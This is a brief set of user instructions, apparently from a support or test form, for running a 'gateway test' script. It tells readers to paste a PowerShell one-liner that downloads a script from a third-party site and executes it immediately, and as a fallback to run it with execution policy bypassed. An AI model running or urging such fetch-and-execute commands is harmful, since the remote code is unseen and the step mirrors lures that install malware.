  1. Open PowerShell (Start → type "PowerShell" → Enter).
  2. Paste this one line and press Enter:
    irm https://sites.simple-host.app/jot-transcribe/jot-sie-test/test.txt | iex

  4. When it finishes, it prints a block ending in RESULT: PASS or RESULT: FAIL. Copy the whole block and paste it below, then Submit.

Can't run the one-liner (blocked download)? Download the script, save it as jot-sie-gateway-test.ps1, and run powershell -ExecutionPolicy Bypass -File .\jot-sie-gateway-test.ps1.
